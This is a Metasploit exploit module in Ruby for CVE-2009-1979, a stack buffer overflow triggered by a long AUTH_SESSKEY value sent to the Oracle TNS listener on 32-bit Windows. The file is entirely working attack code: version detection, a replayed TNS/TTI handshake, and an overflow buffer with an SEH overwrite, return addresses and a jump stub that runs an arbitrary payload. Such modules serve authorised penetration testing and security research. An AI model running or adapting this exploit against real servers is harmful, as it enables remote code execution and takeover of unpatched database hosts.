##
# $Id: tns_auth_sesskey.rb 8183 2010-01-21 00:30:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::TNS
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle TNS Listener AUTH_SESSKEY Buffer Overflow.',
			'Description'    => %q{
				This module exploits a stack buffer overflow in Oracle. When
				sending a specially crafted packet containing a long AUTH_SESSKEY value
				to the TNS service, an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 8183 $',
			'References'     =>
				[
					[ 'CVE', '2009-1979'],
					[ 'OSVDB', '59110'],
					[ 'BID', '36747'],
					[ 'URL', 'http://blogs.conus.info/node/28' ],
					[ 'URL', 'http://blogs.conus.info/node/35' ],
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2009.html' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 0x17e,
					'BadChars' => "", # none, thx memcpy!
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],

					[ 'Oracle 10.2.0.1.0 Enterprise Edition',
						{
							# Untested
							'Ret' => 0x011b0528 # p/p/r in oracle.exe v10.2.0.3
						}
					],
					[ 'Oracle 10.2.0.4.0 Enterprise Edition',
						{
							# Tested OK - 2010-Jan-20 - jduck
							'Ret' => 0x01347468 # p/p/r in oracle.exe v10.2.0.3
						}
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 20 2009'))

			register_options([Opt::RPORT(1521)], self.class)

	end


	def check
		version = tns_version
		if (not version)
			raise RuntimeError, "Unable to detect version!"
		end
		print_status("Oracle version reply: " + version)
		return Exploit::CheckCode::Vulnerable if (version =~ /32-bit Windows: Version 10\.2\.0\.1\.0/)
		return Exploit::CheckCode::Vulnerable if (version =~ /32-bit Windows: Version 10\.2\.0\.4\.0/)
		return Exploit::CheckCode::Safe
	end


	def exploit

		mytarget = nil
		if target.name =~ /Automatic/
         print_status("Attempting automatic target detection...")

			version = tns_version
			if (not version)
				raise RuntimeError, "Unable to detect version!"
			end

			if (version =~ /32-bit Windows: Version 10\.2\.0\.1\.0/)
				mytarget = targets[1]
			elsif (version =~ /32-bit Windows: Version 10\.2\.0\.4\.0/)
				mytarget = targets[2]
			end

			if (not mytarget)
            raise RuntimeError, "Unable to automatically detect the target"
			end

			print_status("Automatically detected target \"#{mytarget.name}\"")
		else
			mytarget = target

			print_status("Attacking using target \"#{mytarget.name}\"")
		end


		username = rand_text_alphanumeric(0x1c)

		connect

		print_status("Sending NSPTCN packet ...")
		connect_data = "" +
			"(DESCRIPTION=" +
				"(CONNECT_DATA=" +
					"(SERVICE_NAME=orcl)" +
					"(CID=" +
						"(PROGRAM=client.exe)" +
						"(HOST=client_host)" +
					")" +
				")" +
				"(ADDRESS=" +
					"(PROTOCOL=TCP)" +
					"(PORT=1521)" +
				")" +
			")"
		nsptcn_pkt = tns_packet(connect_data)
		sock.put(nsptcn_pkt)

		# read NSPTRS (expecting 8 bytes)
		res = sock.get_once(-1, 1)
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		print_status("Re-sending NSPTCN packet ...")
		sock.put(nsptcn_pkt)

		# read NSPTAC (expecting 32 bytes)
		begin
			res = sock.get_once(-1, 1)
		rescue ::Errno::ECONNRESET, EOFError
			raise RuntimeError, "OOPS, maybe the service hasn't started completely yet, try again..."
		end
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		# send NA
		print_status("Sending NA packet ...")
		na_stuff = [0xdeadbeef].pack('N') +
			"\x00\x92" +
			"\x0B\x10\x06\x00\x00\x04\x00\x00\x04\x00\x03\x00\x00\x00\x00\x00" +
			"\x04\x00\x05\x0B\x10\x06\x00\x00\x08\x00\x01\x00\x00\x0A\xF8\x71" +
			"\xC2\x6C\xE1\x00\x12\x00\x01\xDE\xAD\xBE\xEF\x00\x03\x00\x00\x00" +
			"\x04\x00\x04\x00\x01\x00\x01\x00\x02\x00\x01\x00\x03\x00\x00\x00" +
			"\x00\x00\x04\x00\x05\x0B\x10\x06\x00\x00\x02\x00\x03\xE0\xE1\x00" +
			"\x02\x00\x06\xFC\xFF\x00\x02\x00\x02\x00\x00\x00\x00\x00\x04\x00" +
			"\x05\x0B\x10\x06\x00\x00\x0C\x00\x01\x00\x11\x06\x10\x0C\x0F\x0A" +
			"\x0B\x08\x02\x01\x03\x00\x03\x00\x02\x00\x00\x00\x00\x00\x04\x00" +
			"\x05\x0B\x10\x06\x00\x00\x03\x00\x01\x00\x03\x01"
		na_pkt = nsptda_packet(na_stuff)
		sock.put(na_pkt)

		# read response (expecting 127 bytes)
		res = sock.get_once(-1, 1)
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		# send TTIPRO
		print_status("Sending TTIPRO packet ...")
		ttipro_stuff = "\x01\x06\x05\x04\x03\x02\x01\x00" +
			"IBMPC/WIN_NT-8.1.0" +
			"\x00"
		ttipro_pkt = nsptda_packet(ttipro_stuff)
		sock.put(ttipro_pkt)

		# read response (expecting 179 bytes)
		res = sock.get_once(-1, 1)
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		# send TTIDTY
		print_status("Sending TTIDTY packet ...")
		ttidty_stuff = "\x02\xB2\x00\xB2\x00\xD2" +
			"\x25\x06\x01\x01\x01\x0D\x01\x01\x05\x01\x01\x01\x01\x01\x01\x01" +
			"\x7F\xFF\x03\x09\x03\x03\x01\x00\x7F\x01\x1F\xFF\x01\x03\x01\x01" +
			"\x3F\x01\x01\x05\x00\x01\x07\x02\x01\x00\x00\x18\x00\x01\x80\x00" +
			"\x00\x00\x3C\x3C\x3C\x80\x00\x00\x00\xD0\x07"
		ttidty_pkt = nsptda_packet(ttidty_stuff)
		sock.put(ttidty_pkt)

		# read response (expecting 22 bytes)
		res = sock.get_once(-1, 1)
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		# send first auth pkt (call OSESSKEY)
		print_status("Calling OSESSKEY ...")
		params = []
		dtyauth_pkt = dtyauth_packet(0x76, username, 1, params)
		sock.put(dtyauth_pkt)

		# read RPA (expecting 225 bytes)
		res = sock.get_once(-1, 1)
		#print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))

		# build exploit buffer
		print_status("Calling kpoauth with long AUTH_SESSKEY ...")
		sploit = payload.encoded
		sploit << rand_text_alphanumeric(0x19a - 0x17e)
		sploit << generate_seh_record(mytarget.ret)
		distance = payload_space + 8 + 5
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

		# ensure bad ptr is derefed
		value = rand(0x3fffffff) | 0xc0000000
		sploit[0x17e,4] = [value].pack('V')

		# send overflow trigger packet (call kpoauth)
		params = []
		params << {
			'Name'   => 'AUTH_SESSKEY',
			'Value'  => sploit,
			'Flag'   => 1
		}
		dtyauth_pkt = dtyauth_packet(0x73, username, 0x121, params)
		sock.put(dtyauth_pkt)

		# expecting disconnect...
		if (res = sock.get_once(-1, 1))
			print_status(("received %u bytes:\n" % res.length) + Rex::Text.to_hex_dump(res))
			raise RuntimeError, "Try to run the exploit again.. If that doesn't work, the target host may be patched :-/"
		end

		handler
		disconnect
	end


	def tns_version
		connect
		version = "(CONNECT_DATA=(COMMAND=VERSION))"
		pkt = tns_packet(version)
		sock.put(pkt)
		sock.get_once
		res = sock.get_once(-1, 1)
		disconnect
		return res
	end


	def nsptda_packet(data)
		pkt = [data.length + 10].pack('n')    # NSPHDLEN
		pkt << [0].pack('n')                  # NSPHDPSM
		pkt << [6].pack('C')                  # pkt type
		pkt << [0].pack('C')                  # reserved
		pkt << [0].pack('n')                  # NSPHDHSM
		pkt << [0].pack('n')                  # NSPDAFLG
		pkt << data
		return pkt
	end


	def dtyauth_packet(opi, user, flag, params)
		dunno = 2
		dunno = 3 if opi == 0x73

		pkt = [3, opi, dunno].pack('CCC')

		pkt << [-2].pack('V')
		pkt << [user.length].pack('V')
		pkt << [flag].pack('V')

		pkt << [-2].pack('V')
		pkt << [params.length].pack('V')
		pkt << [-2].pack('V')
		pkt << [-2].pack('V')

		pkt << [user.length].pack('C')
		pkt << user

		params.each { |param|
			name = param['Name']
			pkt << [name.length].pack('V')
			pkt << [name.length].pack('C')
			pkt << name

			val = param['Value']
			pkt << [val.length].pack('V')
			if (val.length > 0)
				if (val.length > 0xff)
					pkt << chunkify(val)
				else
					pkt << [val.length].pack('C')
					pkt << val
				end
			end

			flag = param['Flag']
			pkt << [flag].pack('V')
		}
		return nsptda_packet(pkt)
	end


	def chunkify(buf)
		ret = ""
		if buf.length > 0xff
			ret << "\xfe"

			while (buf.length > 0xff)
				ret << "\xff"
				ret << buf.slice!(0, 0xff)
			end
			if buf.length > 0
				ret << [buf.length].pack('C')
				ret << buf
			end

			ret << "\x00"
		else
			ret << [buf.length].pack('C')
			ret << buf
		end
		return ret
	end

end